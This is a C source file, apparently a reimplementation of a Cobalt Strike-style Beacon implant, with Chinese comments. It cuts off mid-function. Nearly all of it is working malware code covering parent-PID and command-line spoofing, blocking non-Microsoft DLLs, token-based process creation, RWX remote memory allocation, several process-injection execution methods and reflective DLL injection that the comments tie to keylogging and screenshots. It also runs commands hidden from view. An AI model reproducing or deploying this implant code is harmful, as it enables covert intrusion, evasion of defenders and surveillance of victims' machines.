#include "BeaconInject.h"
#include "BeaconJob.h"
#include "BeaconX64.h"
//#include "c2profile.h"

void resolve_spawntopath(LPSTR lpDst, BOOL x86)
{
	char Buffer[256];
	memset(Buffer, 0, sizeof(Buffer));
	if (!x86)
	{
		if (spawntoPath_x64 && strlen(spawntoPath_x64))
		{
			_snprintf(Buffer, 0x100u, "%s", spawntoPath_x64);
			BeaconExpandEnvironmentStringsA(Buffer, lpDst, 0x100u);
			return;
		}
		char* post_ex_spawnto_x64 = decryptString(shark_post_ex_spawnto_x64);
		_snprintf(Buffer, 0x100u, "%s", post_ex_spawnto_x64);
		BeaconExpandEnvironmentStringsA(Buffer, lpDst, 0x100);
		return;
	}
	if (!spawntoPath_x86 || !strlen(spawntoPath_x86))
	{
		char* post_ex_spawnto_x86 = decryptString(shark_post_ex_spawnto_x86);
		_snprintf(Buffer, 0x100u, "%s", post_ex_spawnto_x86);
		BeaconExpandEnvironmentStringsA(Buffer, lpDst, 0x100);
		return;
	}
}


void getspawntopath(char* path_buffer, BOOL x86)
{

	memset(path_buffer, 0, 256);
	if (!x86)
	{
		resolve_spawntopath(path_buffer, 0);
		return;
	}
	HANDLE hPrcoess = GetCurrentProcess();
	if (Is_Wow64(hPrcoess))
	{
		resolve_spawntopath(path_buffer, 1);
		return;
	}
	resolve_spawntopath(path_buffer, 1);
	char* pch = strstr(path_buffer, "syswow64");
	if (pch)
	{
		memcpy(pch, "system32", 8);
	}
}

/// <summary>
/// 匹配Beacon设置的进程参数欺骗
/// </summary>
/// <param name="cmd"></param>
/// <param name="pBPS"></param>
/// <returns></returns>
BOOL BeaconProcessParameterSpoofing(char* cmd, BeaconParameterSpoofing* pBPS)
{
	BeaconSpoofArgs* i;

	for (i = gBeaconParameterSpoofing; ; i = i->Linked)
	{
		if (!i)
		{
			return 0;
		}
		if (i->state == 1 && strstr(cmd, i->cmd1) == cmd)
		{
			break;
		}
	}
	pBPS->cmd2 = i->cmd2;
	pBPS->cmd = cmd;
	return 1;
}

int sub_1000357A(BeaconStartProcess* pBeaconStartProcess, LPWSTR lpCommandLine, LPCWSTR lpCurrentDirectory)
{

	if (CreateProcessWithLogonW(
		lpWideCharStr,
		lpDomain,
		lpPassword,
		LOGON_NETCREDENTIALS_ONLY,
		0,
		lpCommandLine,
		pBeaconStartProcess->dwCreationFlags,
		0,
		lpCurrentDirectory,
		(LPSTARTUPINFOW)pBeaconStartProcess->pSTARTUPINFOA,
		pBeaconStartProcess->pPROCESS_INFORMATION))
	{
		return 1;
	}
	if (GetLastError() != ERROR_PATH_NOT_FOUND)
	{
		DWORD LastError = GetLastError();
		BeaconTaskError1Output(0x45u, LastError, pBeaconStartProcess->path);
		return 0;
	}
	if (strlen(pBeaconStartProcess->path) >= 0x100)
	{
		DWORD LastError = GetLastError();
		BeaconTaskError1Output(0x45u, LastError, pBeaconStartProcess->path);
		return 0;
	}
	char Src[256] = {0};
	char* s = strstr(pBeaconStartProcess->path, "sysnative");
	if (s)
	{
		memset(Src, 0, sizeof(Src));
		memcpy(s, "system32", 8);
		s += 9;
		memcpy(Src, s, strlen(s));
		strcpy(s - 1, Src);
		return sub_10003687(pBeaconStartProcess);
	}
	else
	{
		DWORD LastError = GetLastError();
		BeaconTaskError1Output(0x45u, LastError, pBeaconStartProcess->path);
		return 0;
	}
}


int __cdecl sub_10003687(BeaconStartProcess* pBeaconStartProcess)
{

	WCHAR CommandLine[1024] = { 0 };
	WCHAR lpCurrentDirectory[1024] = { 0 };
	pBeaconStartProcess->pSTARTUPINFOA->lpDesktop = 0;
	if (toWideChar(pBeaconStartProcess->path, CommandLine, 1024))
	{
		if (GetCurrentDirectoryW(0, 0) < 1024)
		{
			GetCurrentDirectoryW(1024, lpCurrentDirectory);
		}
		if (CreateProcessWithTokenW(
			pTokenHandle,
			LOGON_NETCREDENTIALS_ONLY,
			0,
			CommandLine,
			pBeaconStartProcess->dwCreationFlags,
			0,
			lpCurrentDirectory,
			(LPSTARTUPINFOW)pBeaconStartProcess->pSTARTUPINFOA,
			pBeaconStartProcess->pPROCESS_INFORMATION))
		{
			return 1;
		}
		if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD && Create_token_Flag == 1)
		{
			return sub_1000357A(pBeaconStartProcess, CommandLine, lpCurrentDirectory);
		}
		if (GetLastError() == ERROR_INVALID_PARAMETER && pBeaconStartProcess->pSTARTUPINFOA->cb == 72)
		{
			DWORD LastError = GetLastError();
			BeaconTaskError1Output(0x4A, LastError, pBeaconStartProcess->path);
		}
		else
		{
			if (GetLastError() == ERROR_PATH_NOT_FOUND && strlen(pBeaconStartProcess->path) < 0x100)
			{
				char Src[256] = {0};
				char* s = strstr(pBeaconStartProcess->path, "sysnative");
				if (s)
				{
					memset(Src, 0, sizeof(Src));
					memcpy(s, "system32", 8);
					s += 9;
					memcpy(Src, s, strlen(s));
					strcpy(s - 1, Src);
					return sub_10003687(pBeaconStartProcess);
				}
			}
			BeaconTaskError1Output(0x29u, GetLastError(), pBeaconStartProcess->path);
		}
	}
	else
	{
		BeaconErrorD(7u, pBeaconStartProcess->path_size);
	}
	return 0;
}



int sub_10003889(BeaconStartProcess* pBeaconStartProcess)
{

	if (!pTokenHandle || pBeaconStartProcess->dwCreationFlags)
	{
		if (!CreateProcessA(
			NULL,
			pBeaconStartProcess->path,
			NULL,
			NULL,
			TRUE,
			pBeaconStartProcess->dwCreationFlags,
			NULL,
			NULL,
			pBeaconStartProcess->pSTARTUPINFOA,
			pBeaconStartProcess->pPROCESS_INFORMATION))
		{
			int LastError = GetLastError();
			BeaconTaskError1Output(0x30, LastError, pBeaconStartProcess->path);
			return 0;
		}
	}
	else if (!CreateProcessAsUserA(
		pTokenHandle,
		0,
		pBeaconStartProcess->path,
		0,
		0,
		1,
		pBeaconStartProcess->dwCreationFlags,
		0,
		0,
		pBeaconStartProcess->pSTARTUPINFOA,
		pBeaconStartProcess->pPROCESS_INFORMATION))
	{
		if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
		{
			return sub_10003687(pBeaconStartProcess);
		}
		int LastError = GetLastError();
		BeaconTaskError1Output(0x29, LastError, pBeaconStartProcess->path);
		return 0;
	}
	return 1;
}





int sub_1000391C(BeaconStartProcess* pBeaconStartProcess)
{
	BeaconParameterSpoofing pBPS;
	if ((pBeaconStartProcess->dwCreationFlags & 4) != 0 || !BeaconProcessParameterSpoofing(pBeaconStartProcess->path, &pBPS))
	{
		return sub_10003889(pBeaconStartProcess);
	}
	char* cmd2 = pBPS.cmd2;
	pBeaconStartProcess->dwCreationFlags |= 4u;
	pBeaconStartProcess->path = cmd2;
	int returnvalue = sub_10003889(pBeaconStartProcess);
	int ret = sub_10003444(pBeaconStartProcess->pPROCESS_INFORMATION, &pBPS) == 0;
	PROCESS_INFORMATION* pPROCESS_INFORMATION = pBeaconStartProcess->pPROCESS_INFORMATION;
	if (ret)
	{
		TerminateProcess(pPROCESS_INFORMATION->hProcess, 0);
		return 0;
	}
	else
	{
		ResumeThread(pPROCESS_INFORMATION->hThread);
		return returnvalue;
	}
}

int __cdecl ProcessPPIDSet(BeaconCreateprocess* lpValue, DWORD dwProcessId, LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, STARTUPINFOA* psi)
{
	HANDLE hprocess = OpenProcess(0x1FFFFF, 0, dwProcessId);
	if (!hprocess)
	{
		BeaconErrorDD(0x22u, dwProcessId, GetLastError());
		return 0;
	}
	lpValue->process = hprocess;
	if (!UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue, sizeof(HANDLE), 0, 0))
	{
		BeaconErrorD(0x47, GetLastError());
		CloseHandle(hprocess);
		return 0;
	}
	if (!psi->hStdOutput)
	{
		if (!psi->hStdOutput == 0)
		{
			DuplicateHandle(GetCurrentProcess(), psi->hStdOutput, hprocess, &psi->hStdOutput, 0, TRUE, DUPLICATE_CLOSE_SOURCE| DUPLICATE_SAME_ACCESS);
		}
		if (psi->hStdError)
		{
			DuplicateHandle(GetCurrentProcess(), psi->hStdError, hprocess, &psi->hStdError, 0, TRUE, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
		}
		return 1;
	}

	if (!psi->hStdError || psi->hStdOutput != psi->hStdError)
	{
		if (!psi->hStdOutput == 0)
		{
			DuplicateHandle(GetCurrentProcess(), psi->hStdOutput, hprocess, &psi->hStdOutput, 0, TRUE, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
		}

		if (psi->hStdError)
		{
			DuplicateHandle(GetCurrentProcess(), psi->hStdError, hprocess, &psi->hStdError, 0, TRUE, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
		}
		return 1;
	}
	DuplicateHandle(GetCurrentProcess(), psi->hStdOutput, hprocess, &psi->hStdOutput, 0, TRUE, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
	psi->hStdError = psi->hStdOutput;
	return 1;
}


int __cdecl ProcessBlockdllsSet(BeaconCreateprocess* pBeaconCreateprocess, DWORD dwProcessId, LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, STARTUPINFOA* psi)
{
	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	if (UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), 0, 0))
	{
		pBeaconCreateprocess->SetErrorMode_value = SetErrorMode(0x8003);
		return 1;
	}
	else
	{
		BeaconErrorD(0x47, GetLastError());
		return 0;
	}
}


BeaconCreateprocess* InitProcessPPIDStruct(BeaconCreateprocess* pBeaconCreateprocess)
{
	pBeaconCreateprocess->process = (HANDLE)-1;
	pBeaconCreateprocess->ProcessSettings = ProcessPPIDSet;
	pBeaconCreateprocess->func2 = BeaconcloseHandle;
	return pBeaconCreateprocess;
}
BeaconCreateprocess* InitProcessBlockdllsStruct(BeaconCreateprocess* pBeaconCreateprocess)
{
	pBeaconCreateprocess->ProcessSettings = ProcessBlockdllsSet;
	pBeaconCreateprocess->func2 = BeaconSetErrorMode;
	return pBeaconCreateprocess;
}

int CreateProcessCore(BeaconStartProcess* pStartProcess, int PPIDPID)
{
	BOOL Opt = isPPIDAndBlockDLL(PPIDPID);
	if (!Opt)
	{
		return sub_1000391C(pStartProcess);
	}
	_PROC_THREAD_ATTRIBUTE_LIST* lpAttributeList = CreateProcessAttributeList(Opt);
	BeaconCreateprocess pBeaconCreateprocess1 = {0};
	BeaconCreateprocess pBeaconCreateprocess2 = {0};
	InitProcessPPIDStruct(&pBeaconCreateprocess1);
	InitProcessBlockdllsStruct(&pBeaconCreateprocess2);
	int ret = 0;
	if (
		(!PPIDPID 
			|| 
			pBeaconCreateprocess1.ProcessSettings(&pBeaconCreateprocess1, PPIDPID, lpAttributeList, pStartProcess->pSTARTUPINFOA)
			)
		&& 
		(gBeaconBlockDLL != 1 
			|| 
			pBeaconCreateprocess2.ProcessSettings(&pBeaconCreateprocess2, PPIDPID,lpAttributeList,pStartProcess->pSTARTUPINFOA)
			)
		)
	{

		//进行扩充将STARTUPINFOA扩充到STARTUPINFOEXA
		STARTUPINFOEXA SIEX = {0};
		memcpy(&SIEX, pStartProcess->pSTARTUPINFOA, sizeof(STARTUPINFOA));
		SIEX.lpAttributeList = lpAttributeList;
		SIEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);
		
		pStartProcess->pSTARTUPINFOA = (STARTUPINFOA*)&SIEX;
		pStartProcess->dwCreationFlags|= 0x80000;
		ret = sub_1000391C(pStartProcess);
		if (PPIDPID)
		{
			pBeaconCreateprocess1.func2(&pBeaconCreateprocess1);
		}
		if (gBeaconBlockDLL == 1)
		{
			pBeaconCreateprocess2.func2(&pBeaconCreateprocess2);
		}
	}
	DeleteProcThreadAttributeList(lpAttributeList);
	HeapFree(GetProcessHeap(), 0, lpAttributeList);
	return ret;
}


int BeaconCreateProcess(char* path,int path_size,_STARTUPINFOA* sInfo,PROCESS_INFORMATION* pInfo,int dwCreationFlags,int ignoreToken,int PPID)
{
	BeaconStartProcess pStartProcess;

	pStartProcess.path = path;
	pStartProcess.path_size = path_size;
	pStartProcess.pSTARTUPINFOA = sInfo;
	pStartProcess.pPROCESS_INFORMATION = pInfo;
	pStartProcess.dwCreationFlags = dwCreationFlags;
	pStartProcess.ignoreToken = ignoreToken;
	return CreateProcessCore(&pStartProcess, PPID);
}

int BeaconExecuteCommand(char* path,int path_size,STARTUPINFOA* sInfo,PROCESS_INFORMATION* pInfo,int dwCreationFlags,int ignoreToken)
{
	return BeaconCreateProcess(path, path_size, sInfo, pInfo, dwCreationFlags, ignoreToken, gBeaconPPID);
}

int BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFOA* sInfo, PROCESS_INFORMATION* pInfo)
{
	char path[256] = { 0 };

	getspawntopath(path, x86);
	return BeaconExecuteCommand(path, strlen(path), sInfo, pInfo, 4, ignoreToken);
}

/// <summary>
/// 初始化BeaconProcessInject
/// </summary>
/// <param name="hProcess"></param>
/// <param name="pi"></param>
/// <param name="pid"></param>
/// <param name="pBeaconProcessInject"></param>
void sub_10004B81(HANDLE hProcess, PROCESS_INFORMATION* pi, int pid, BeaconProcessInject* pBeaconProcessInject)
{
	pBeaconProcessInject->hProcess = hProcess;
	pBeaconProcessInject->Process_PID = pid;
	pBeaconProcessInject->Flag_FALSE = X86orX64() != 0;
	int v5 = is_process_arch(hProcess) != 0;
	int v6 = v5 == pBeaconProcessInject->Flag_FALSE;
	pBeaconProcessInject->is_process_arch = v5;
	pBeaconProcessInject->is_system_process = v6;
	pBeaconProcessInject->is_Process_self = pid == GetCurrentProcessId();
	if (pi)
	{
		pBeaconProcessInject->ishThread = 1;
		pBeaconProcessInject->hThread = pi->hThread;
	}
	else
	{
		pBeaconProcessInject->ishThread = 0;
		pBeaconProcessInject->hThread = 0;
	}
}

/// <summary>
/// 分配内存
/// </summary>
/// <param name="ProcessHandle"></param>
/// <param name="payload"></param>
/// <param name="Size"></param>
/// <returns></returns>
PVOID sub_10005053(HANDLE ProcessHandle, char* payload, size_t Size)
{
	PVOID BaseAddress = 0;
	ULONG_PTR ViewSize =0;
	int min_alloc = decryptInt(shark_min_alloc);//.process-inject.min_alloc
	if (Size > min_alloc)
	{
		min_alloc = Size;
	}
	auto ntdllbase = GetModuleHandleA("ntdll.dll");
	NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(ntdllbase, "NtMapViewOfSection");
	if (!NtMapViewOfSection)
	{
		return 0;
	}
	HANDLE FileMappingA = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, min_alloc, 0);
	if (FileMappingA != (HANDLE)-1)
	{
		PVOID payloadaddr = MapViewOfFile(FileMappingA, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		if (payloadaddr)
		{
			memcpy(payloadaddr, payload, Size);
			int userwx = decryptInt(shark_userwx); //.process-inject.userwx
			NtMapViewOfSection(FileMappingA, ProcessHandle, &BaseAddress, 0, 0, 0, &ViewSize, 1, 0, userwx);
			UnmapViewOfFile(payloadaddr);
		}
		CloseHandle(FileMappingA);
	}
	if (!BaseAddress)
	{
		BeaconErrorD(0x49u, GetLastError());
	}
	return BaseAddress;
}


char* sub_10005120(HANDLE ProcessHandle, char* payload, size_t Size)
{

	int min_alloc = decryptInt(shark_min_alloc);
	if (Size > min_alloc)
	{
		min_alloc = Size;
	}
	int startrwx = decryptInt(shark_bofrwx);//.process-inject.startrwx
	char* payloadaddr = (char*)VirtualAllocEx(ProcessHandle, 0, min_alloc, 0x3000u, startrwx);
	if (!payloadaddr)
	{
		BeaconErrorDD(0x1Fu, min_alloc, GetLastError());
		return 0;
	}
	int NumberBytes = 0;
	SIZE_T NumberOfBytesWritten = 0;
	DWORD flOldProtect = 0;
	if (Size > 0)
	{
		while (WriteProcessMemory(ProcessHandle, &payloadaddr[NumberBytes], &payload[NumberBytes], Size - NumberBytes, &NumberOfBytesWritten))
		{
			NumberBytes += NumberOfBytesWritten;
			if (!NumberOfBytesWritten)
			{
				return 0;
			}
			if (NumberBytes >= Size)
			{
				int userwx = decryptInt(shark_userwx);
				if (decryptInt(shark_bofrwx) != userwx)
				{
					if (!VirtualProtectEx(ProcessHandle, payloadaddr, min_alloc, userwx, &flOldProtect))
					{
						BeaconErrorD(0x11u, GetLastError());
						return 0;
					}
				}
				return payloadaddr;
			}
		}
		BeaconErrorD(0x10, GetLastError());
		return 0;
	}
	int userwx = decryptInt(shark_userwx);
	if (decryptInt(shark_bofrwx) != userwx)
	{
		if (!VirtualProtectEx(ProcessHandle, payloadaddr, min_alloc, userwx, &flOldProtect))
		{
			BeaconErrorD(0x11, GetLastError());
			return 0;
		}
	}
	return payloadaddr;
}


BOOL sub_100054CC(char* payload, int p_len)
{
	return p_len >= 51200 && *(WORD*)payload == 'ZM' && *((DWORD*)payload + 255) == 0xF4F4F4F4;
}

/// <summary>
/// 初始化反射注入中的一些函数
/// </summary>
/// <param name="payload"></param>
/// <param name="pBeaconProcessInject"></param>
/// <param name="p_len"></param>
void sub_100054F7(char* payload, BeaconProcessInject* pBeaconProcessInject, int p_len)
{
	ULONG_PTR* data = (DWORD_PTR*)payload;
	if (sub_100054CC(payload, p_len))
	{
		if (pBeaconProcessInject->is_system_process)
		{
			data[252] = (ULONG_PTR)GetProcAddress;
			data[251] = (ULONG_PTR)LoadLibraryA;
			data[253] = (ULONG_PTR)VirtualAlloc;
			data[255] = 61453;
			data[254] = (ULONG_PTR)VirtualProtect;
		}
	}
}


char* allocator_option(size_t payload_size, BeaconProcessInject* pBeaconProcessInject, char* payload)
{
	char* result;
	// 分配远程内存的方式 VirtualAllocEx or NtMapViewOfSection
	if (decryptInt(shark_virtualalloc) == 1 && pBeaconProcessInject->is_system_process)
	{
		result = (char*)sub_10005053(pBeaconProcessInject->hProcess, payload, payload_size);
	}
	else
	{
		result = sub_10005120(pBeaconProcessInject->hProcess, payload, payload_size);
	}
	return result;
}

char* sub_1000520B(size_t payload_size, char* payload)
{

	int min_alloc = decryptInt(shark_min_alloc);
	if (payload_size > min_alloc)
	{
		min_alloc = payload_size + 1024;
	}
	int startrwx = decryptInt(shark_bofrwx);
	char* payloadAddress = (char*)VirtualAlloc(0, min_alloc, MEM_RESERVE | MEM_COMMIT, startrwx);
	if (payloadAddress)
	{
		memcpy(payloadAddress, payload, payload_size);
		return CheckMemoryRWX(payloadAddress, min_alloc) != 0 ? payloadAddress : 0;
	}
	else
	{
		BeaconErrorDD(0x1F, min_alloc, GetLastError());
		return 0;
	}
}





#include "BeaconX64.h"
int sub_10004955(BeaconProcessInject* pBeaconProcessInject, int prepended_data_size, char* BaseAddress, LPVOID lpParameter)
{
	datap pdatap;
	char* process_inject_execute = decryptString(shark_process_inject_execute);//.process-inject.execute

	BeaconDataParse(&pdatap, process_inject_execute, 128);
	while (2)
	{
		switch (BeaconDataByte(&pdatap))
		{
		case 0:
			return 0;
		case 1:
		{
			if (!pBeaconProcessInject->is_Process_self)
			{
				continue;
			}
			if (!BeaconCreateThread((LPTHREAD_START_ROUTINE)&BaseAddress[prepended_data_size], lpParameter))
			{
				continue;
			}
			return 1;
		}
		case 2:
			if (!pBeaconProcessInject->ishThread)
			{
				continue;
			}

			#ifdef _WIN64
			if (!sub_1800121D8(pBeaconProcessInject, (DWORD64)&BaseAddress[prepended_data_size], (DWORD64)lpParameter))
			{
				continue;
			}
			return 1;

			#else
			if (!sub_10005463(pBeaconProcessInject, &BaseAddress[prepended_data_size], lpParameter))
			{
				continue;
			}
			return 1;

			#endif // _WIN64

		case 3:
			if (!pBeaconProcessInject->is_system_process)
			{
				continue;
			}
			if (!BeaconCreateRemoteThread(pBeaconProcessInject->hProcess, (LPTHREAD_START_ROUTINE)&BaseAddress[prepended_data_size], lpParameter))
			{
				continue;
			}
			return 1;
		case 4:
			if (pBeaconProcessInject->is_system_process)
			{
				if (!BeaconRtlCreateUserThread(pBeaconProcessInject->hProcess, &BaseAddress[prepended_data_size], lpParameter))
				{
					continue;
				}
				return 1;
			}
			if (sub_1000535D(pBeaconProcessInject->hProcess, &BaseAddress[prepended_data_size], lpParameter))
			{
				return 1;
			}
			if (!pBeaconProcessInject->is_system_process)
			{
				continue;
			}
			if (!BeaconRtlCreateUserThread(pBeaconProcessInject->hProcess, &BaseAddress[prepended_data_size], lpParameter))
			{
				continue;
			}
			return 1;
		case 5:
			if (pBeaconProcessInject->is_Process_self || !pBeaconProcessInject->is_system_process || pBeaconProcessInject->ishThread)
			{
				continue;
			}
			if (!sub_10004DDE(pBeaconProcessInject, &BaseAddress[prepended_data_size], lpParameter))
			{
				continue;
			}
			return 1;
		case 6:
		{
			int offset = BeaconDataShort(&pdatap);
			char* lpModuleName = BeaconDataPtr2(&pdatap);
			char* lpProcName = BeaconDataPtr2(&pdatap);
			if (!pBeaconProcessInject->is_Process_self)
			{
				continue;
			}
			if (!sub_10004FA1(6, pBeaconProcessInject->hProcess, &BaseAddress[prepended_data_size], lpParameter, lpModuleName, lpProcName, offset))
			{
				continue;
			}
			return 1;
		}

		case 7:
		{
			int offset = BeaconDataShort(&pdatap);
			char* lpModuleName = BeaconDataPtr2(&pdatap);
			char* lpProcName = BeaconDataPtr2(&pdatap);
			if (!pBeaconProcessInject->is_system_process)
			{
				continue;
			}
			if (!sub_10004FA1(7, pBeaconProcessInject->hProcess, &BaseAddress[prepended_data_size], lpParameter, lpModuleName, lpProcName, offset))
			{
				continue;
			}
			return 1;
		}
		case 8:
			if (!pBeaconProcessInject->ishThread || !pBeaconProcessInject->is_system_process)
			{
				continue;
			}
			if (!BeaconNtQueueApcThread(pBeaconProcessInject, &BaseAddress[prepended_data_size], lpParameter))
			{
				continue;
			}
			return 1;
		default:
			continue;
		}
	}
}



void sub_10004B35(size_t payload_size, BeaconProcessInject* pBeaconProcessInject, int prepended_data_size, char* payload, LPVOID lpParameter)
{
	char* BaseAddress;
	if (pBeaconProcessInject->is_Process_self)
	{
		BaseAddress = (char*)sub_1000520B(payload_size, payload);// 注入进程自身
	}
	else
	{
		BaseAddress = allocator_option(payload_size, pBeaconProcessInject, payload);
	}
	if (BaseAddress)
	{
		if (!sub_10004955(pBeaconProcessInject, prepended_data_size, BaseAddress, lpParameter))// 进程注入
		{
			BeaconErrorDD(0x48u, pBeaconProcessInject->Process_PID, GetLastError());
		}
	}
}


void ProcessInject(int pid, PROCESS_INFORMATION* pi, HANDLE hProcess, char* payload, size_t p_len, int p_offset, char* arg, int a_len)
{

	char* parameter_addr;
	BeaconProcessInject pBeaconProcessInject;
	sub_10004B81(hProcess, pi, pid, &pBeaconProcessInject);
	sub_100054F7(payload, &pBeaconProcessInject, p_len);
    char* process_inject_transform = NULL;
    if(pBeaconProcessInject.is_process_arch == 1){
        process_inject_transform = decryptString(shark_process_inject_transform_x64);
    } else{
        process_inject_transform = decryptString(shark_process_inject_transform_x32);
    }
	// 46  .process-inject.transform-x86   256 bytes
												  // 47  .process-inject.transform-x64   256 bytes
	datap pdatap;
	BeaconDataParse(&pdatap, process_inject_transform, 256);

	//此处就是处理进程注入附加在payload前后自定义数据部分
	int prepended_data_size = BeaconDataInt(&pdatap);
	char* prepended_data = BeaconDataPtr(&pdatap, prepended_data_size);
	int appended_data_size = BeaconDataInt(&pdatap);
	char* appended_data = BeaconDataPtr(&pdatap, appended_data_size);
	if (a_len <= 0)
	{
		parameter_addr = 0;
	}
	else
	{
		parameter_addr = allocator_option(a_len, &pBeaconProcessInject, arg);
	}
	if (prepended_data_size || appended_data_size)
	{
		BeaconFormatAlloc((formatp*)&pdatap, appended_data_size + prepended_data_size + p_len + 16);
		BeaconFormatAppend((formatp*)&pdatap, prepended_data, prepended_data_size);
		BeaconFormatAppend((formatp*)&pdatap, payload, p_len);
		BeaconFormatAppend((formatp*)&pdatap, appended_data, appended_data_size);// 组装payload
		int buff_size = BeaconFormatlength((formatp*)&pdatap);
		char* buff = BeaconFormatOriginalPtr((formatp*)&pdatap);
		sub_10004B35(buff_size, &pBeaconProcessInject, p_offset + prepended_data_size, buff, parameter_addr);
		BeaconFormatFree((formatp*)&pdatap);
	}
	else
	{
		sub_10004B35(p_len, &pBeaconProcessInject, p_offset, payload, parameter_addr);
	}
}


/// <summary>
/// Beacon内部功能keyLogger Printscreen PsInject Screenshot Screenwatch使用的反射dll注入
/// </summary>
/// <param name="Taskdata"></param>
/// <param name="Taskdata_size"></param>
/// <param name="Flag"></param>
void BeaconReflectiveDLLInject(char* Taskdata, int Taskdata_size, int x86)
{
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Taskdata_size);
	DWORD pid = BeaconDataInt(&pdatap);
	int p_offset = BeaconDataInt(&pdatap);
	HANDLE hProcess = OpenProcess(1082u, 0, pid);
	if (!hProcess)
	{
		BeaconErrorDD(33, pid, GetLastError());
		return;
	}
	int arch = is_process_arch(hProcess);
	if (!x86)
	{
		if (!arch)
		{
			BeaconErrorD(19, pid);
			return;
		}
		int payloadsize = BeaconDataLength(&pdatap);
		char* payload = BeaconDataBuffer(&pdatap);
		ProcessInject(pid, 0, hProcess, payload, payloadsize, p_offset, 0, 0);// 进程注入函数
		CloseHandle(hProcess);
		return;
	}
	if (!arch)
	{
		int payloadsize = BeaconDataLength(&pdatap);
		char* payload = BeaconDataBuffer(&pdatap);
		ProcessInject(pid, 0, hProcess, payload, payloadsize, p_offset, 0, 0);// 进程注入函数
		CloseHandle(hProcess);
		return;
	}
	BeaconErrorD(18, pid);
}

/// <summary>
/// 
/// </summary>
/// <param name="ignoreToken"></param>
/// <param name="data"></param>
/// <param name="Size"></param>
/// <param name="x86"></param>
void BeaconSpawnX86(BOOL ignoreToken, char* data, size_t Size, BOOL x86)
{

	STARTUPINFOA StartupInfo;
	_PROCESS_INFORMATION pi = { 0 };
	check_close_token_fake(ignoreToken);
	StartupInfo = { 0 };
	StartupInfo.cb = sizeof(STARTUPINFOA);
	GetStartupInfoA(&StartupInfo);
	StartupInfo.wShowWindow = 0;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdOutput = 0;
	StartupInfo.hStdError = 0;
	StartupInfo.hStdInput = 0;
	if (BeaconSpawnTemporaryProcess(x86, ignoreToken, &StartupInfo, &pi))
	{
		Sleep(100);
		ProcessInject(pi.dwProcessId, &pi, pi.hProcess, data, Size, 0, 0, 0);
		check_restore_token_fake(ignoreToken);
		BeaconcloseAllHandle(&pi);
	}
	else
	{
		check_restore_token_fake(ignoreToken);
	}

}


void BeaconWow64DisableWow64FsRedirection(PVOID* OldValue)
{
	Wow64DisableWow64FsRedirection(OldValue);
}
void BeaconWow64RevertWow64FsRedirection(PVOID OldValue)
{
	Wow64RevertWow64FsRedirection(OldValue);
}


void ExecuteCommand(char* cmd, int cmdsize)
{
	PROCESS_INFORMATION pi = {0};
	SECURITY_ATTRIBUTES PipeAttributes;
	PipeAttributes.lpSecurityDescriptor = 0;
	PipeAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	PipeAttributes.bInheritHandle = 1;

	HANDLE hReadPipe;
	HANDLE hWritePipe;
	CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x100000u);

	STARTUPINFOA StartupInfo;
	StartupInfo.cb = sizeof(STARTUPINFOA);
	GetStartupInfoA(&StartupInfo);
	StartupInfo.wShowWindow = 0;
	StartupInfo.hStdOutput = hWritePipe;
	StartupInfo.hStdError = hWritePipe;
	StartupInfo.dwFlags = 257;
	StartupInfo.hStdInput = 0;
	if (BeaconExecuteCommand(cmd, cmdsize, &StartupInfo, &pi, CREATE_NEW_CONSOLE, 0))
	{
		WaitForSingleObject(pi.hProcess, 0x2710);
		Add_Beacon_0Job(pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId, hReadPipe, hWritePipe, "process")->JobType = 30;
	}
}

void BeaconRunCommand(char* Taskdata, int Taskdata_size)
{
	datap* pdatap = BeaconDataInit(0x8000u);
	char* envpath = BeaconDataPtr(pdatap, 0x2000);
	char* exepath = BeaconDataPtr(pdatap, 0x2000);
	char* arg = BeaconDataPtr(pdatap, 0x2000);
	char* Command = (char*)BeaconDataPtr(pdatap, 0x2000);

	datap taskdatap;
	BeaconDataParse(&taskdatap, Taskdata, Taskdata_size);
	BeaconDataCopyToBuffer(&taskdatap, envpath, 0x2000);
	BeaconDataCopyToBuffer(&taskdatap, arg, 0x2000);
	int redirect = BeaconDataShort(&taskdatap);
	BeaconExpandEnvironmentStringsA(envpath, exepath, 0x2000u);
	strncat_s(Command, 0x2000u, exepath, 0x2000u);
	strncat_s(Command, 0x2000u, arg, 0x2000u);
	PVOID OldValue;
	if ((redirect & 1) != 0)
	{
		BeaconWow64DisableWow64FsRedirection(&OldValue);
		ExecuteCommand(Command, strlen(Command) + 1);
		BeaconWow64RevertWow64FsRedirection(OldValue);
	}
	else
	{
		ExecuteCommand(Command, strlen(Command) + 1);
	}
	BeaconDataClearFree(pdatap);
}





//************************************
// Method:    AddSpoofArgs
// FullName:  AddSpoofArgs
// Access:    public 
// Returns:   BeaconSpoofArgs*
// Qualifier:检查gBeaconParameterSpoofing是否具有相同的命令欺骗
// Parameter: const char * buffer
//************************************
BeaconSpoofArgs* AddSpoofArgs(const char* buffer)
{

	BeaconSpoofArgs* oldgBeaconParameterSpoofing = gBeaconParameterSpoofing;
	BeaconSpoofArgs* pgBeaconParameterSpoofing = gBeaconParameterSpoofing;
	if (pgBeaconParameterSpoofing)
	{
